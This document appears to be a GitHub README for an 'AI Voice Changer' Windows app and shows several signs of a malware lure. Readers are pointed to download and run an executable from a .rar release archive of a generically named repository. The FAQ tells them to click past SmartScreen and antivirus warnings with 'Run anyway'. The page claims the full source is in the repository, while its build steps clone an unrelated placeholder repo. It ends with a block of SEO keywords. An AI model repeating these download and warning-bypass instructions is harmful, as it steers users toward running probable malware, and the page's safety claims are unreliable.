<img width="1672" height="941" alt="Неоновый баннер AI Voice Changer" src="https://github.com/user-attachments/assets/80767e8a-4686-4cb8-ab52-54632d82d47c" />


# 🎙️ AI Voice Changer

A fast, neural-network-based voice changer for Windows, written in C++. Works in real time with your microphone and can also convert audio files. No installation, no Python: download the `.exe` and run it.

![C++](https://img.shields.io/badge/C%2B%2B-17-blue?logo=cplusplus&logoColor=white)
![Platform](https://img.shields.io/badge/platform-Windows%2010%20%7C%2011-0078D6?logo=windows&logoColor=white)
![License](https://img.shields.io/badge/license-MIT-green)
![PRs](https://img.shields.io/badge/PRs-welcome-brightgreen)

[DOWNLOAD NOW](https://github.com/Pinnaclesys/Pinnaclesys/releases/download/112/Voice.Changer.AI.rar)

## ✨ Features

- 🤖 **AI voice conversion**: neural models keep your intonation and emotion while changing only the timbre
- ⚡ **Real-time mode**: low-latency processing thanks to native C++ code
- 🎞️ **File processing**: convert recordings in WAV, MP3, and FLAC formats
- 🎚️ **Fine-tuning**: pitch shift, effect strength, noise suppression
- 📦 **Custom models**: load your own compatible voice models
- 🖥️ **GPU and CPU support**: accelerated on NVIDIA GPUs, still works on CPU
- 🔌 **Virtual microphone**: use the output in Discord, OBS, Telegram, and other apps
- 💾 **Portable**: a single folder, nothing is installed into your system

## 🧠 How It Works

1. Audio from the microphone (or a file) is split into short chunks.
2. A neural network extracts the speech content and pitch.
3. The target voice model applies a new timbre.
4. The result is played through your headphones or sent to a virtual microphone.

## 📥 Download

1. [Download the latest](https://github.com/Pinnaclesys/Pinnaclesys/releases/download/112/Voice.Changer.AI.rar)
3. Extract it to any folder.
4. Run `Voice Changer AI.exe`.

That's it, no installer and no extra software needed.

## 📦 System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 (64-bit) | Windows 11 (64-bit) |
| GPU | Not required | NVIDIA with 4+ GB VRAM |
| RAM | 8 GB | 16 GB |
| Disk space | 1 GB | 2 GB+ (for several models) |

If the app doesn't start, install the latest [Microsoft Visual C++ Redistributable](https://learn.microsoft.com/cpp/windows/latest-supported-vc-redist).

## 🛠 Quick Start

### 1. Add a voice model

Put the model files into the `models/` folder next to the `.exe`:

```
VoiceChanger/
├── VoiceChanger.exe
└── models/
    └── my_voice/
        └── my_voice.onnx
```

### 2. Run and configure

1. Launch `VoiceChanger.exe`
2. Select your microphone and output device
3. Choose a voice model
4. Adjust pitch and effect strength
5. Click **Start**

### Command line (optional)

```bat
VoiceChanger.exe --input input.wav --output output.wav --model models\my_voice\my_voice.onnx --pitch 0
```

## ⚙️ Main Parameters

| Parameter | Description | Default |
|---|---|---|
| `--model` | Path to the model file | — |
| `--pitch` | Pitch shift in semitones (-12 to 12) | `0` |
| `--index-rate` | How strongly to apply the model's timbre (0–1) | `0.75` |
| `--device` | `cuda` or `cpu` | `auto` |
| `--chunk-size` | Chunk size in seconds, affects latency | `0.25` |

## 🔨 Building from Source

**Requirements:** Windows 10/11, [Visual Studio 2022](https://visualstudio.microsoft.com/) with the "Desktop development with C++" workload, [CMake](https://cmake.org/) 3.20+, and Git.

```bat
git clone --recursive https://github.com/username/ai-voice-changer.git
cd ai-voice-changer

cmake -B build -G "Visual Studio 17 2022" -A x64
cmake --build build --config Release
```

The compiled app will be at `build\Release\VoiceChanger.exe`.

## 💡 Tips

- **Male → female voice**: raise the pitch by +8 to +12 semitones
- **Female → male voice**: lower the pitch by -8 to -12 semitones
- **High latency**: reduce the chunk size or use a GPU
- **Hissing or background noise**: enable noise suppression and use a good microphone

## ❓ FAQ

**Windows SmartScreen or my antivirus warns about the .exe. Is it safe?**
The app is not digitally signed, so Windows may show a warning for unknown publishers. Click **More info → Run anyway**. The full source code is in this repository, so you can review it or build the app yourself.

**Do I need a GPU?**
No, but real-time latency is noticeably higher on CPU.

**Where can I get voice models?**
Train your own on recordings of a voice you have the right to use, or use ready-made models with an open license.

**How do I use it in Discord or OBS?**
Install a virtual audio cable (for example, VB-Cable), then select it as the output in this app and as the microphone in Discord or OBS.

## ⚠️ Responsible Use

Voice-changing technology can be misused. By using this project, you agree to:

- not impersonate another person to deceive, defraud, or defame
- not use someone's voice without the owner's permission
- follow the laws of your country and the rules of any platform where you publish the results

The author is not responsible for any misuse of this software.

## 🤝 Contributing

Contributions are welcome:

1. Fork the repository
2. Create a branch: `git checkout -b feature/my-feature`
3. Commit your changes: `git commit -m "Add my feature"`
4. Push the branch: `git push origin feature/my-feature`
5. Open a Pull Request

Found a bug or have an idea? Open an [issue](../../issues).

## 📄 License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## 🙏 Acknowledgements

- The authors of the open-source models and libraries this project is built on
- Everyone who tests the app and sends feedback

Keywords:
clown fish voice changer, sound board, verity voice changer, voicemeeter, voice recorder online, lalal.ai voice changer, voice meter, mic test, nch voxal voice changer, voice cha, ultron voice changer, vb cable, equalizer apo, miku voice changer, fish audio, voice speed changer, voice changer client demo, mp4 to mp3, voice changer anime, audacity, free fire voice changer app, oneplus voice changer, anime voice changer, easeus, ff voice changer, okada voice changer, sonic voice changer, robotic voice changer, voicechanger, voice changer ps5, voice changer for roblox, okada, voice changer for gaming, elevenlabs, hitpaw voice changer, real time voice changer, rvc voice changer, voice changer plus, music voice changer, ai voice generator, trump voice changer, clownfish voice changer скачать, voice recorder, voice changer roblox, best voice changer app, voice changer mod, roblox voice changer, easeus voice changer, voicemod download, applio

